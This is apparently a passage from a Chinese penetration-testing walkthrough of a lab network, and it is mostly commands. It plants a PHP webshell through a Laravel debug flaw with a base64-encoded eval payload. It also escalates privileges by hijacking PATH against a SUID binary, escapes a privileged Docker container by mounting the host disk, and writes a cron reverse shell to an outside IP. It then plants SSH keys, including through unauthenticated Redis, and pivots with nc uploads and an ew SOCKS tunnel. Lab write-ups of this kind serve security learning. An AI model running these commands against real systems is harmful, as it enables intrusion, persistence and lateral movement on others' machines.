1.2 Laravel Debug

system('echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php');

1.3 Docker逃逸

SUID提权

SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行

使用find命令来搜索具有SUID或4000权限的文件

find / -perm -u=s -type f 2>/dev/null


不知道2> dev/null是什么意思可以去看这篇博客

https://www.cnblogs.com/ultranms/p/9353157.html

接着我们发现一个可疑的shell文件

(www-data:/var/www/html) $ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/home/jobs/shell
/bin/mount
/bin/su
/bin/umount


执行后发现shell文件执行了ps命令

(www-data:/home/jobs) $ ./shell
   PID TTY          TIME CMD
     1 ?        00:00:00 apache2
    65 ?        00:00:00 shell
    66 ?        00:00:00 sh
    67 ?        00:00:00 ps


此时我们可以在/tmp目录下创建一个同名的ps文件，并将其导入环境变量

echo "#!/bin/bash /bin/bash" > ps
chmod 777 ps
echo $PATH 
export PATH=/tmp:$PATH


再一次运行./shell，就拥有了root权限

特权模式逃逸

sudo docker run -itd --privileged ubuntu:latest /bin/bash


使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令

关于docker逃逸的方法介绍

https://www.cnblogs.com/xiaozi/p/13423853.html

fdisk -l
mkdir hello
mount /dev/sda1 /hello
ls /hello
echo '* * * * * bash -i >& /dev/tcp/192.168.0.9/1233 0>&1' >> /hello/var/spool/cron/root


但是攻击机迟迟没收到反弹的shell，只有再更换思路

ssh写入

在挂载的基础上，我们尝试ssh写入，首先在攻击机上生成密钥

ssh-keygen -f hello
chmod 600 hello


接着在受害机上写入密钥

cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制

echo > /hello/home/ubuntu/.ssh/authorized_keys #清空authorized_keys文件

cat hello.pub > /hello/home/ubuntu/.ssh/authorized_keys #将ssh秘钥写入authorized_keys文件

cat /hello/home/ubuntu/.ssh/authorized_keys #查看是否写入成功

ssh -i hello ubuntu@192.168.52.20


成功连接！

nmap扫描pc1

发现8080端口开放，可能是内部oa系统，开始搭建隧道，尝试登陆oa。在这之前我们需要先拿下web1的权限，作为跳板，才能访问。。。

在后续的信息搜集中，我们发现web1存在redis未授权漏洞，于是写入ssh连接getshell

攻击机kali

ssh-keygen -t rsa #生成公钥
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt #将公钥导入foo.txt文件
cat foo.txt | redis-cli -h 192.168.1.46 -p 6379 -x set hello #把foo.txt文件内容写入目标主机的redis缓冲中


redis

config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/
config set dbfilename authorized_keys    # 设置保存文件名为authorized_keys
save    # 将数据保存在目标服务器硬盘上
ssh 192.168.1.46 # 连接


成功连接

之后我们使用nc上传ew并搭建隧道

nc -l 666 > ew #ubuntu
nc 192.168.1.46 < ew #kali

./ew_for_linux64 -s rcsocks -l 1080 -e 1234 #kali
./ew_for_linux64 -s rssocks -d 192.168.1.7 -e 1234 #ubuntu


隧道搭建成功会返回[ok]，之后在proxychains.conf配置一下就好了(配置教程参照之前的博文)
